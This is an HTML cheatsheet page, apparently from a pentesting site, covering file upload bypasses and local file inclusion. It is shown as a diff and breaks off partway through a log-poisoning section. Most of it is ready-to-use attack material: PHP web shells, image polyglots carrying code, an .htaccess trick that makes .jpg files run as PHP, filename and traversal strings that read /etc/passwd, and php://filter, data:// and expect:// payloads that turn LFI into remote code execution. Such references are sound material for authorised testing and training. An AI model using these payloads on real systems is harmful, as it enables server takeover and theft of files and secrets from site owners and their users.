@@ -1,0 +1,788 @@
+<!DOCTYPE html>
+<html lang="en-US" dir="ltr" class="">
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>File Upload &amp; LFI | JinPwn</title><meta name="description" content="Upload a file that gets interpreted as code, or trick the app into including a file with malicious content. Both lead to RCE.">
+<meta name="robots" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
+<meta name="googlebot" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
+
+<link rel="canonical" href="https://jinpwn.dev/cheatsheets/web/web13-file-upload--lfi/">
+<meta property="og:title" content="File Upload &amp; LFI | JinPwn">
+<meta property="og:description" content="Upload a file that gets interpreted as code, or trick the app into including a file with malicious content. Both lead to RCE.">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://jinpwn.dev/cheatsheets/web/web13-file-upload--lfi/">
+<meta property="og:site_name" content="JinPwn">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://jinpwn.dev/images/og/og.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="File Upload &amp; LFI | JinPwn">
+<meta name="twitter:description" content="Upload a file that gets interpreted as code, or trick the app into including a file with malicious content. Both lead to RCE.">
+<meta name="twitter:image" content="https://jinpwn.dev/images/og/og.png">
+<meta name="twitter:site" content="@jinpwn">
+<meta name="twitter:creator" content="@jinpwn">
+
+
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"WebPage","description":"Upload a file that gets interpreted as code, or trick the app into including a file with malicious content. Both lead to RCE.","image":["https://jinpwn.dev/images/og/og.png"],"inLanguage":"en-US","name":"File Upload \u0026 LFI | JinPwn","url":"https://jinpwn.dev/cheatsheets/web/web13-file-upload--lfi/"}</script>
+
+<meta name="theme-color" content="#111111">
+<link rel="icon" type="image/png" href="/favicon.png">
+
+      <link rel="stylesheet" href="/css/site.min.bbc8db26832d45b71fab2c52bea8e7468ac7f3d71458dff1936b8d5891ff48a8.css" integrity="sha256-u8jbJoMtRbcfqyxSvqjnRorH89cUWN/xk2uNWJH/SKg=" crossorigin="anonymous">
+
+
+        <script src="/js/main.e9594fc927ccbd51f2ef3a698abafb8bbf09dcc796037e0a51eedfb14ca858f4.js" integrity="sha256-6VlPySfMvVHy7zppirr7i78J3MeWA34KUe7fsUyoWPQ=" crossorigin="anonymous" defer></script>
+        <script src="/js/asm-highlight.d74879c0e3b6982d95821f5d83904fa40660a6a7e4a2442cdc4bda545679f540.js" integrity="sha256-10h5wOO2mC2Vgh9dg5BPpAZgpqfkokQs3EvaVFZ59UA=" crossorigin="anonymous" defer></script>
+
+
+</head>
+<body class="">
+  
+
+
+
+
+
+  
+  
+  
+
+
+
+  
+
+<header class="site-header">
+  <nav class="top-nav">
+    <div class="container nav-inner">
+      <div class="nav-left">
+        <a href="/" class="brand-link has-logo" aria-label="Home"><img src="/favicon.png" alt="jinpwn.dev" class="brand-logo" style="--brand-logo-height: 36px;"></a>
+        <div class="nav-links desktop-only">
+          
+    <a href="/">Posts</a>
+    <a href="/posts/">Archive</a>
+    <a href="/cheatsheets/" class="is-current">Cheatsheets</a>
+    <a href="/about/">About</a>
+
+        </div>
+      </div>
+      <div class="nav-actions">
+        <div class="search-anchor" id="search-root" data-search-root>
+          <label class="search-trigger" for="search-input">
+            <span class="search-glyph" aria-hidden="true">
+              <svg viewBox="0 0 24 24">
+                <circle cx="11" cy="11" r="7"></circle>
+                <path d="M20 20L16.65 16.65"></path>
+              </svg>
+            </span>
+            <input id="search-input" type="search" placeholder="Search..." autocomplete="off" spellcheck="false" aria-label="Search posts and cheatsheets">
+            <button type="button" class="search-clear" data-search-clear aria-label="Clear search" hidden>
+              <svg viewBox="0 0 24 24" aria-hidden="true">
+                <path d="M18 6L6 18"></path>
+                <path d="M6 6l12 12"></path>
+              </svg>
+            </button>
+            <span class="search-trigger-shortcut desktop-only" aria-hidden="true">CTRL K</span>
+          </label>
+          <div id="search-dropdown" class="search-dropdown" hidden data-search-index-url="/search-index.json" data-search-runtime-url="/js/search-flex.1b1c225e3d6a2ff08480727a5e3bf93df59715e138fede75b7616d9c75fc4fa7.js">
+  <p class="search-status" data-search-status aria-live="polite">Type to search posts and cheatsheets.</p>
+  <div class="search-results" data-search-results role="listbox" aria-label="Search results">
+    <p class="search-empty">Type to search posts and cheatsheets.</p>
+  </div>
+</div>
+
+        </div>
+        <button class="icon-button mobile-only" type="button" data-search-mobile-toggle aria-label="Search" aria-expanded="false" aria-controls="search-root">
+          <svg viewBox="0 0 24 24" aria-hidden="true">
+            <circle cx="11" cy="11" r="7"></circle>
+            <path d="M20 20L16.65 16.65"></path>
+          </svg>
+        </button>
+        <button class="icon-button mobile-only" type="button" data-mobile-toggle aria-label="Toggle menu" aria-expanded="false" aria-controls="mobile-nav">
+          <svg viewBox="0 0 24 24" aria-hidden="true" data-menu-open-icon>
+            <path d="M3 6h18"></path>
+            <path d="M3 12h18"></path>
+            <path d="M3 18h18"></path>
+          </svg>
+          <svg viewBox="0 0 24 24" aria-hidden="true" data-menu-close-icon hidden>
+            <path d="M18 6L6 18"></path>
+            <path d="M6 6l12 12"></path>
+          </svg>
+        </button>
+      </div>
+    </div>
+    <div id="mobile-nav" class="mobile-nav">
+      
+    <a href="/">Posts</a>
+    <a href="/posts/">Archive</a>
+    <a href="/cheatsheets/" class="is-current">Cheatsheets</a>
+    <a href="/about/">About</a>
+
+    </div>
+  </nav>
+</header>
+
+  
+  <main class="site-main">
+    
+  
+  
+  
+  <article class="container cheatsheet-docs-shell">
+    <div class="cheatsheet-docs-layout">
+      
+        <aside class="cheatsheet-sidebar" aria-label="Web Pentesting navigation">
+    <div class="cheatsheet-sidebar-inner">
+      
+        <a href="/cheatsheets/" class="cheatsheet-sidebar-root">All cheatsheets</a>
+      
+      <a href="/cheatsheets/web/" class="cheatsheet-sidebar-section">Web Pentesting</a>
+      
+        <nav class="cheatsheet-sidebar-nav">
+          <ul class="cheatsheet-sidebar-list">
+            
+              <li>
+                <a href="/cheatsheets/web/00-web-moc/" class="cheatsheet-sidebar-link">Web MOC</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web01-content-discovery/" class="cheatsheet-sidebar-link">Content Discovery</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web02-auth--session/" class="cheatsheet-sidebar-link">Auth &amp; Session</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web03-sql-injection/" class="cheatsheet-sidebar-link">SQL Injection</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web04-nosql-injection/" class="cheatsheet-sidebar-link">NoSQL Injection</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web05-command-injection/" class="cheatsheet-sidebar-link">Command Injection</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web06-ssti/" class="cheatsheet-sidebar-link">SSTI</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web08-xss/" class="cheatsheet-sidebar-link">XSS</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web07-xxe/" class="cheatsheet-sidebar-link">XXE</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web09-csrf--cors/" class="cheatsheet-sidebar-link">WEB09 CSRF &amp; CORS</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web10-request-smuggling/" class="cheatsheet-sidebar-link">Request Smuggling</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web11-web-cache-poisoning/" class="cheatsheet-sidebar-link">Web Cache Poisoning</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web12-ssrf/" class="cheatsheet-sidebar-link">SSRF</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web13-file-upload--lfi/" class="cheatsheet-sidebar-link is-current">File Upload &amp; LFI</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web14-deserialization/" class="cheatsheet-sidebar-link">Deserialization</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/web/web15-prototype-pollution/" class="cheatsheet-sidebar-link">WEB15 Prototype Pollution</a>
+              </li>
+            
+          </ul>
+        </nav>
+      
+    </div>
+  </aside>
+      
+      <div class="cheatsheet-docs-main cheatsheet-page-main">
+        <header class="cheatsheet-page-header">
+          <h1>File Upload &amp; LFI</h1>
+          
+        </header>
+
+        
+          <details class="cheatsheet-mobile-sections">
+    <summary class="cheatsheet-mobile-sections-summary">
+      <span class="cheatsheet-mobile-sections-label">Sections</span>
+      <span class="cheatsheet-mobile-sections-current">File Upload &amp; LFI</span>
+      <span class="cheatsheet-mobile-sections-caret" aria-hidden="true"></span>
+    </summary>
+    <div class="cheatsheet-mobile-sections-panel">
+      <nav aria-label="Web Pentesting sections">
+        <ul class="cheatsheet-mobile-sections-list">
+          
+            <li>
+              <a href="/cheatsheets/" class="cheatsheet-mobile-sections-link cheatsheet-mobile-sections-root">All cheatsheets</a>
+            </li>
+          
+          <li>
+            <a href="/cheatsheets/web/" class="cheatsheet-mobile-sections-link">Overview</a>
+          </li>
+          
+            <li>
+              <a href="/cheatsheets/web/00-web-moc/" class="cheatsheet-mobile-sections-link">Web MOC</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web01-content-discovery/" class="cheatsheet-mobile-sections-link">Content Discovery</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web02-auth--session/" class="cheatsheet-mobile-sections-link">Auth &amp; Session</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web03-sql-injection/" class="cheatsheet-mobile-sections-link">SQL Injection</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web04-nosql-injection/" class="cheatsheet-mobile-sections-link">NoSQL Injection</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web05-command-injection/" class="cheatsheet-mobile-sections-link">Command Injection</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web06-ssti/" class="cheatsheet-mobile-sections-link">SSTI</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web08-xss/" class="cheatsheet-mobile-sections-link">XSS</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web07-xxe/" class="cheatsheet-mobile-sections-link">XXE</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web09-csrf--cors/" class="cheatsheet-mobile-sections-link">WEB09 CSRF &amp; CORS</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web10-request-smuggling/" class="cheatsheet-mobile-sections-link">Request Smuggling</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web11-web-cache-poisoning/" class="cheatsheet-mobile-sections-link">Web Cache Poisoning</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web12-ssrf/" class="cheatsheet-mobile-sections-link">SSRF</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web13-file-upload--lfi/" class="cheatsheet-mobile-sections-link is-current">File Upload &amp; LFI</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web14-deserialization/" class="cheatsheet-mobile-sections-link">Deserialization</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/web/web15-prototype-pollution/" class="cheatsheet-mobile-sections-link">WEB15 Prototype Pollution</a>
+            </li>
+          
+        </ul>
+      </nav>
+    </div>
+  </details>
+        
+
+        <div class="markdown-content cheatsheet-page-body">
+          <p>Upload a file that gets interpreted as code, or trick the app into including a file with malicious content. Both lead to RCE.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">T</span><span class="o">=</span>https://target.com
+</span></span></code></pre></div><h2 id="i-where-it-lives" data-heading-permalink="true"><span class="heading-content">i. Where it lives</span>
+    <a class="heading-permalink" href="#i-where-it-lives" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<h3 id="file-upload" data-heading-permalink="true"><span class="heading-content">File Upload</span>
+    <a class="heading-permalink" href="#file-upload" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<ul>
+<li>Avatar / profile picture upload</li>
+<li>Document attachment (tickets, support, messages)</li>
+<li>Resume / CV upload (parsed by HR system)</li>
+<li>Import features (CSV, XML, JSON, archives)</li>
+<li>File-sharing applications</li>
+<li>Plugin / theme upload (WordPress, vBulletin, etc)</li>
+<li>Image processing (thumbnail generation, format conversion)</li>
+</ul>
+<h3 id="local-file-inclusion-lfi" data-heading-permalink="true"><span class="heading-content">Local File Inclusion (LFI)</span>
+    <a class="heading-permalink" href="#local-file-inclusion-lfi" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<ul>
+<li><code>?file=</code> / <code>?page=</code> / <code>?template=</code> / <code>?include=</code> URL parameters</li>
+<li>Language selectors (<code>?lang=en</code> → <code>include('lang/' . $_GET['lang'] . '.php')</code>)</li>
+<li>Theme / skin parameters</li>
+<li>Help / docs viewer endpoints</li>
+<li>Plugin loaders</li>
+<li>API endpoints that take filenames</li>
+</ul>
+<h3 id="remote-file-inclusion-rfi" data-heading-permalink="true"><span class="heading-content">Remote File Inclusion (RFI)</span>
+    <a class="heading-permalink" href="#remote-file-inclusion-rfi" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>Rare in modern PHP (default <code>allow_url_include=Off</code>), but found on legacy installs. Same input pattern as LFI but accepts full URLs.</p>
+<h2 id="ii-file-upload---bypass-techniques" data-heading-permalink="true"><span class="heading-content">ii. File upload - bypass techniques</span>
+    <a class="heading-permalink" href="#ii-file-upload---bypass-techniques" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>The defense levels you&rsquo;ll typically encounter:</p>
+<h3 id="layer-1-extension-blacklist" data-heading-permalink="true"><span class="heading-content">Layer 1: Extension blacklist</span>
+    <a class="heading-permalink" href="#layer-1-extension-blacklist" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>Server rejects <code>.php</code>, <code>.jsp</code>, <code>.exe</code>. Try lesser-known executable extensions:</p>
+<table>
+  <thead>
+      <tr>
+          <th>Server</th>
+          <th>Extensions that get executed</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>PHP</td>
+          <td><code>.php</code>, <code>.php3</code>, <code>.php4</code>, <code>.php5</code>, <code>.php7</code>, <code>.pht</code>, <code>.phar</code>, <code>.phtml</code>, <code>.phps</code>, <code>.pgif</code>, <code>.shtml</code>, <code>.htaccess</code></td>
+      </tr>
+      <tr>
+          <td>ASP.NET</td>
+          <td><code>.asp</code>, <code>.aspx</code>, <code>.ashx</code>, <code>.asmx</code>, <code>.config</code>, <code>.cer</code>, <code>.asax</code>, <code>.cshtml</code></td>
+      </tr>
+      <tr>
+          <td>Java</td>
+          <td><code>.jsp</code>, <code>.jspx</code>, <code>.jsw</code>, <code>.jsv</code>, <code>.jspf</code>, <code>.war</code></td>
+      </tr>
+      <tr>
+          <td>Node</td>
+          <td><code>.js</code>, depends on app routing - less interesting via upload</td>
+      </tr>
+      <tr>
+          <td>Generic</td>
+          <td><code>.htaccess</code> (Apache only) to remap extensions, <code>.htpasswd</code>, <code>web.config</code> (IIS)</td>
+      </tr>
+  </tbody>
+</table>
+<p><code>.phtml</code>, <code>.phar</code>, <code>.shtml</code> are commonly missed in PHP blacklists.</p>
+<h3 id="layer-2-extension-allowlist" data-heading-permalink="true"><span class="heading-content">Layer 2: Extension allowlist</span>
+    <a class="heading-permalink" href="#layer-2-extension-allowlist" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>Server only accepts <code>.jpg</code>, <code>.png</code>, <code>.gif</code>. Bypass strategies:</p>
+<p><strong>Double extension</strong>:</p>
+<pre tabindex="0"><code>shell.php.jpg    ## sometimes Apache executes .php in middle when .jpg not registered handler
+shell.jpg.php
+</code></pre><p><strong>Null byte injection</strong> (PHP &lt; 5.3 only):</p>
+<pre tabindex="0"><code>shell.php%00.jpg
+</code></pre><p><strong>Case variations</strong>:</p>
+<pre tabindex="0"><code>shell.pHp
+shell.PHP
+shell.pHtMl
+</code></pre><p><strong>Path traversal in filename</strong>:</p>
+<pre tabindex="0"><code>filename=../../shell.php   ## traverses out of upload dir into a php-executable dir
+</code></pre><p><strong>Multiple extensions</strong> (Apache mod_mime quirk):</p>
+<pre tabindex="0"><code>shell.php.foo.bar    ## Apache trims unknown extensions right-to-left
+</code></pre><h3 id="layer-3-magic-byte--mime-sniffing-check" data-heading-permalink="true"><span class="heading-content">Layer 3: Magic byte / MIME-sniffing check</span>
+    <a class="heading-permalink" href="#layer-3-magic-byte--mime-sniffing-check" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>Server reads first bytes of the file to verify it&rsquo;s actually an image:</p>
+<p><strong>Polyglot files</strong>: a single file that is BOTH a valid image AND valid code in another language.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## Simplest GIF polyglot:</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;GIF89a;&lt;?php system($_GET[0]); ?&gt;&#39;</span> &gt; shell.php
+</span></span><span class="line"><span class="cl"><span class="c1">## Server sees GIF89a magic bytes → thinks it&#39;s an image. PHP engine ignores everything before &lt;?php.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## JPG with embedded PHP:</span>
+</span></span><span class="line"><span class="cl">exiftool -Comment<span class="o">=</span><span class="s2">&#34;&lt;?php system(</span><span class="nv">$_GET</span><span class="s2">[0]); ?&gt;&#34;</span> cat.jpg
+</span></span><span class="line"><span class="cl">mv cat.jpg shell.php.jpg    <span class="c1">## or rename based on extension trick</span>
+</span></span></code></pre></div><h3 id="layer-4-content-type-validation" data-heading-permalink="true"><span class="heading-content">Layer 4: Content-Type validation</span>
+    <a class="heading-permalink" href="#layer-4-content-type-validation" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>Server checks the request&rsquo;s Content-Type header. Just modify it in Burp:</p>
+<pre tabindex="0"><code>Content-Type: image/png    ## even when actual file is .php
+</code></pre><h3 id="layer-5-server-side-image-processing" data-heading-permalink="true"><span class="heading-content">Layer 5: Server-side image processing</span>
+    <a class="heading-permalink" href="#layer-5-server-side-image-processing" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>Server processes the image (resize, convert, strip metadata). This usually destroys polyglot payloads. Bypass:</p>
+<p><strong>ImageMagick CVE chain</strong> (ImageTragick, GhostButt, etc) - see [[WEB07 XXE]] section viii for context, ImageMagick-Tragick payloads can still hit older installs.</p>
+<p><strong>SVG with embedded JS / XXE</strong>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; standalone=&#34;yes&#34;?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE svg [&lt;!ENTITY x SYSTEM &#34;file:///etc/passwd&#34;&gt;</span>]&gt;
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;svg</span> <span class="na">xmlns=</span><span class="s">&#34;http://www.w3.org/2000/svg&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;text&gt;</span><span class="ni">&amp;x;</span><span class="nt">&lt;/text&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/svg&gt;</span>
+</span></span></code></pre></div><p>Upload as <code>avatar.svg</code>. When the app renders it, XXE fires.</p>
+<h3 id="layer-6-path--filename-sanitization" data-heading-permalink="true"><span class="heading-content">Layer 6: Path / filename sanitization</span>
+    <a class="heading-permalink" href="#layer-6-path--filename-sanitization" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>Server strips path traversal, sanitizes filename. Try:</p>
+<ul>
+<li>Null byte in path: <code>../../../shell.php%00.jpg</code></li>
+<li>Unicode normalization: <code>‥/‥/shell.php</code> (using Unicode lookalikes)</li>
+<li>URL-encoded slashes: <code>..%2F..%2Fshell.php</code></li>
+<li>Double-URL-encoding: <code>..%252F..%252Fshell.php</code></li>
+</ul>
+<h2 id="iii-the-htaccess-upload-trick" data-heading-permalink="true"><span class="heading-content">iii. The .htaccess upload trick</span>
+    <a class="heading-permalink" href="#iii-the-htaccess-upload-trick" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>When you can upload any file (no extension filtering at all OR Apache backend), upload a custom <code>.htaccess</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-apache" data-lang="apache"><span class="line"><span class="cl"><span class="nb">AddType</span> application/x-httpd-php .jpg
+</span></span></code></pre></div><p>Then upload <code>shell.jpg</code> containing PHP code. Apache now executes <code>.jpg</code> files as PHP in that directory.</p>
+<h2 id="iv-web-shell-choices-by-language" data-heading-permalink="true"><span class="heading-content">iv. Web shell choices by language</span>
+    <a class="heading-permalink" href="#iv-web-shell-choices-by-language" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<table>
+  <thead>
+      <tr>
+          <th>Stack</th>
+          <th>Web shell</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>PHP</td>
+          <td><code>&lt;?php system($_GET[0]); ?&gt;</code></td>
+      </tr>
+      <tr>
+          <td>JSP / Tomcat</td>
+          <td>JSP shell from PayloadsAllTheThings</td>
+      </tr>
+      <tr>
+          <td>ASP.NET</td>
+          <td>Tiny aspx shell, see PAT</td>
+      </tr>
+      <tr>
+          <td>Node.js</td>
+          <td>Less common via upload, more via dep confusion / RCE</td>
+      </tr>
+      <tr>
+          <td>Python (Flask/Django)</td>
+          <td>Pickle / template injection via upload</td>
+      </tr>
+  </tbody>
+</table>
+<p>For full shell payloads per language, see <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files" target="_blank" rel="noopener noreferrer">PayloadsAllTheThings - Upload Insecure Files</a>
+.</p>
+<p>For getting a stable callback after upload, see [[Reverse Shells]] - the JSP/ASPX shells from msfvenom are battle-tested.</p>
+<h2 id="v-tools-for-upload-bypass-discovery" data-heading-permalink="true"><span class="heading-content">v. Tools for upload bypass discovery</span>
+    <a class="heading-permalink" href="#v-tools-for-upload-bypass-discovery" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<h3 id="upload-scanner-burp-extension" data-heading-permalink="true"><span class="heading-content">Upload Scanner (Burp extension)</span>
+    <a class="heading-permalink" href="#upload-scanner-burp-extension" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>Automatic file upload testing. Sends every common extension/Content-Type combination, watches responses.</p>
+<h3 id="fuxploider" data-heading-permalink="true"><span class="heading-content">fuxploider</span>
+    <a class="heading-permalink" href="#fuxploider" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git clone https://github.com/almandin/fuxploider
+</span></span><span class="line"><span class="cl">python3 fuxploider.py --url <span class="s2">&#34;</span><span class="nv">$T</span><span class="s2">/upload.php&#34;</span> --not-regex <span class="s2">&#34;Wrong&#34;</span> -m <span class="m">10</span>
+</span></span></code></pre></div><p>Tests many extension/MIME combinations to find what slips through.</p>
+<h3 id="file-upload-bypass-scanner--upload-bypass" data-heading-permalink="true"><span class="heading-content">file-upload-bypass-scanner / Upload-Bypass</span>
+    <a class="heading-permalink" href="#file-upload-bypass-scanner--upload-bypass" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>Various tools on GitHub do the same thing - automated extension/MIME fuzzing.</p>
+<p>Manual is often more reliable: identify the framework, look at PayloadsAllTheThings for that stack&rsquo;s known bypasses.</p>
+<h2 id="vi-lfi---the-basics" data-heading-permalink="true"><span class="heading-content">vi. LFI - the basics</span>
+    <a class="heading-permalink" href="#vi-lfi---the-basics" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>The fundamental pattern:</p>
+<pre tabindex="0"><code>?file=../../etc/passwd
+?file=....//....//etc/passwd     ## bypass once-stripped ..
+?file=..%2f..%2fetc%2fpasswd     ## URL encoding
+?file=..%252f..%252fetc%252fpasswd  ## double URL encoding
+?file=/etc/passwd                ## absolute path
+?file=/etc/passwd%00             ## null byte (PHP &lt; 5.3)
+?file=/proc/self/environ         ## env vars (often has User-Agent etc)
+</code></pre><p>Probe with these patterns until you see <code>/etc/passwd</code> content in the response.</p>
+<h2 id="vii-php-wrappers-for-lfi" data-heading-permalink="true"><span class="heading-content">vii. PHP wrappers for LFI</span>
+    <a class="heading-permalink" href="#vii-php-wrappers-for-lfi" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>PHP supports stream wrappers that turn LFI into more useful primitives:</p>
+<h3 id="phpfilter-file-read-often-the-most-useful" data-heading-permalink="true"><span class="heading-content">php://filter (file read, often the most useful)</span>
+    <a class="heading-permalink" href="#phpfilter-file-read-often-the-most-useful" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>Encode the file contents in base64 to read binary-safe:</p>
+<pre tabindex="0"><code>?file=php://filter/convert.base64-encode/resource=/etc/passwd
+?file=php://filter/convert.base64-encode/resource=index.php   ## read source code
+?file=php://filter/read=convert.base64-encode/resource=../config.php
+</code></pre><p>Decode the base64 in the response. Reads source code of the app - a goldmine for finding more bugs.</p>
+<h3 id="phpfilter-chain-to-rce-no-upload-needed" data-heading-permalink="true"><span class="heading-content">php://filter chain to RCE (no upload needed!)</span>
+    <a class="heading-permalink" href="#phpfilter-chain-to-rce-no-upload-needed" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>A series of PHP filters can be chained to generate arbitrary content. Synacktiv published a generator that produces a php:// filter chain delivering arbitrary PHP code through nothing but an LFI:</p>
+<ul>
+<li><a href="https://github.com/synacktiv/php_filter_chain_generator" target="_blank" rel="noopener noreferrer">https://github.com/synacktiv/php_filter_chain_generator</a>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 php_filter_chain_generator.py --chain <span class="s1">&#39;&lt;?php system($_GET[0]); ?&gt;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## Outputs a long base64-encoded php://filter URL</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## Use it directly:</span>
+</span></span><span class="line"><span class="cl">?file<span class="o">=</span>&lt;the generated chain&gt;<span class="p">&amp;</span><span class="nv">0</span><span class="o">=</span>id
+</span></span></code></pre></div><p>This is the single most powerful LFI escalation technique in 2024+ for PHP.</p>
+<h3 id="data-when-allow_url_includeon" data-heading-permalink="true"><span class="heading-content">data:// (when allow_url_include=On)</span>
+    <a class="heading-permalink" href="#data-when-allow_url_includeon" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<pre tabindex="0"><code>?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWzBdKTsgPz4=&amp;0=id
+</code></pre><h3 id="expect-when-pecl-expect-is-installed-rare" data-heading-permalink="true"><span class="heading-content">expect:// (when PECL expect is installed, rare)</span>
+    <a class="heading-permalink" href="#expect-when-pecl-expect-is-installed-rare" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<pre tabindex="0"><code>?file=expect://id
+</code></pre><h3 id="phar-deserialization--lfi--rce-without-uploading-php" data-heading-permalink="true"><span class="heading-content">phar:// (deserialization + LFI = RCE without uploading PHP)</span>
+    <a class="heading-permalink" href="#phar-deserialization--lfi--rce-without-uploading-php" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>When you can upload a <code>.phar</code> file and trigger an LFI that loads it, the phar metadata deserializes. See [[WEB14 Deserialization]].</p>
+<h3 id="zip-read-files-inside-an-uploaded-zip" data-heading-permalink="true"><span class="heading-content">zip:// (read files inside an uploaded zip)</span>
+    <a class="heading-permalink" href="#zip-read-files-inside-an-uploaded-zip" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<pre tabindex="0"><code>?file=zip:///tmp/uploaded.zip%23payload.php
+</code></pre><p>Combined with upload, can be a useful chain when direct PHP execution is blocked.</p>
+<h2 id="viii-lfi-to-rce-classical-chains" data-heading-permalink="true"><span class="heading-content">viii. LFI to RCE classical chains</span>
+    <a class="heading-permalink" href="#viii-lfi-to-rce-classical-chains" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Beyond php://filter, the classic LFI-to-RCE paths:</p>
+<h3 id="log-poisoning" data-heading-permalink="true"><span class="heading-content">Log poisoning</span>
+    <a class="heading-permalink" href="#log-poisoning" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<ol>
+<li>Inject PHP code into a log the server writes (User-Agent into access log, error log)</li>
+<li>Include the log file via LFI</li>
+<li>PHP executes the injected code</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## Apache access log:</span>
+</span></span><span class="line"><span class="cl">?file<span class="o">=</span>/var/log/apache2/access.log
+</span></span><span class="line"><span class="cl"><span class="c1">## Then send a request with:</span>
